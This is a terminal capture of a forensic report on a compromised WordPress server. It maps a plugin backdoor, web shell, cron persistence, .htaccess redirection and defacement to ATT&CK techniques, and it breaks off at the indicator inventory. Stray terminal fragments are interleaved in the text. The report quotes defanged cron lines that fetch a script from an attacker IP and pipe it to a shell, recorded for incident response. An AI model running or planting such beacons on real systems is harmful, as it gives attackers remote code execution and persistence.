[?2004l[?2004h> intrusion = """# Intrusion Forensic Investigation Report
[?2004l[?2004h> 
[?2004l[?2004h> **Victim Host:** wordpress-prod-01 (`/sas/cti/advisory.txt:4`)  
[?2004l[?2004h> **Suspected Origin IP:** `198.51.100.40` (`/sas/cti/advisory.txt:4`, `/disk/var/log/nginx/access.log:297`)  
[?2004l[?2004h> **Threat Campaign:** Operation FormTrap (`/sas/cti/advisory.txt:1`)  
[?2004l[?2004h> **Vendor Threat Advisory:** VTA-2024-0816 (`/sas/cti/advisory.txt:2`)  
[?2004l[?2004h> 
[?2004l[?2004h> ---
[?2004l[?2004h> 
[?2004l[?2004h> ## 1. Executive Summary
[?2004l[?2004h> 
[?2004l[?2004h> On August 16, 2024, threat actor `198.51.100.40` (`/sas/cti/advisory.txt:4`) exploited an unauthenticated Remote Code Execution backdoor (CVE-2022-1609) in the "Smart Contact Form" / School Management WordPress plugin (`/disk/var/www/html/wp-content/plugins/contact/inc.php:1-5`, `/sas/vulns.json:2`).
[?2004l[?2004h> 
[?2004l[?2004h> While endpoint security feeds alerted on initial webshell execution (`/sas/alerts.json:4`) and defacement (`/sas/alerts.json:11`), forensic disk analysis uncovered **silent post-exploitation persistence and redirection mechanisms** that completely bypassed alert coverage:  
[?2004l[?2004h> 1. Scheduled cron job for `www-data` (`/disk/var/spool/cron/crontabs/www-data:2`).  
[?2004l[?2004h> 2. Scheduled cron job for `root` (`/disk/etc/crontab:5`).  
[?2004l# 1[?2004h> 3. Traffic redirection rules in `.htaccess` (`/disk/var/www/html/.htaccess:2`).
[?2004l[?2004h> 
[?2004l[?2004h> ---
[?2004l[?2004h> 
[?2004l[?2004h> ## 2. Attack Chain & MITRE ATT&CK Mapping
[?2004l[?2004h> 
[?2004l[?2004h> ### Step 1: Initial Access (T1190 - Exploit Public-Facing Application)
[?2004l[?2004h> - **Activity:** Attacker probed web application and executed code via POST requests (`/disk/var/log/nginx/access.log:297`, `/sas/vulns.json:2`).
[?2004l[?2004h> - **Alert Status:** Covered by ALERT-01 (`/sas/alerts.json:4`).
[?2004l[?2004h> 
[?2004l[?2004h> ### Step 2: Web Shell Persistence (T1505.003 - Web Shell)
[?2004l[?2004h> - **Activity:** Attacker accessed PHP backdoor at `/var/www/html/wp-content/plugins/contact/inc.php` (`/disk/var/www/html/wp-content/plugins/contact/inc.php:1-5`).
[?2004l[?2004h> - **Alert Status:** Covered by ALERT-01 (`/sas/alerts.json:4`).
[?2004l[?2004h> 
[?2004l[?2004h> ### Step 3: Scheduled Task Persistence (T1053.003 - Scheduled Task/Job: Cron)
[?2004l[?2004h> - **Activity:** Attacker established dual crontab persistence for `www-data` and `root`:
[?2004lest to `[?2004h>   - `www-data` crontab: `/disk/var/spool/cron/crontabs/www-data:2` (`# * * * * www-data <defanged beacon: curl hxxp://198.51.100.40/payload.sh | bash>`)
[?2004l[?2004h>   - `root` crontab: `/disk/etc/crontab:5` (`# * * * * root <defanged beacon: curl hxxp://198.51.100.40/x | sh>`)
[?2004l[?2004h> - **Alert Status:** **SILENT / UNALERTED** (Omitted from `/sas/alerts.json`).
[?2004l[?2004h> 
[?2004l[?2004h> ### Step 4: Command and Control (T1071.001 - Web Protocols)
[?2004l[?2004h> - **Activity:** Crontabs continuously initiate outbound HTTP sessions to C2 infrastructure (`198.51.100.40` and `update-wordpress.example.cn`) (`/disk/var/spool/cron/crontabs/www-data:2`, `/disk/etc/crontab:5`, `/sas/cti/advisory.txt:18`).
[?2004l[?2004h> 
[?2004ll[?2004h> ### Step 5: Traffic Redirection (T1505.003 / Redirection)
[?2004l[?2004h> - **Activity:** Attacker added rewrite rules in `/var/www/html/.htaccess` (`/disk/var/www/html/.htaccess:2`):
[?2004l[?2004h>   `.htaccess RewriteRule redirect of all traffic to 198.51.100.40 (pharma)`
[?2004l[?2004h> - **Alert Status:** **SILENT / UNALERTED** (Omitted from `/sas/alerts.json`).
[?2004l Quar[?2004h> 
[?2004l[?2004h> ### Step 6: Site Defacement (T1491.001 - Internal Defacement)
[?2004l[?2004h> - **Activity:** Created defacement landing page `/var/www/html/index.html` (`/disk/var/www/html/index.html:1-4`).
[?2004lci[?2004h> - **Alert Status:** Covered by ALERT-02 (`/sas/alerts.json:11`).
[?2004l[?2004h> 
[?2004l [?2004h> ---
[?2004lto u[?2004h> 
[?2004l[?2004h> ## 3. Threat Entity & Indicator Inventory
[?2004l[?2004h> 
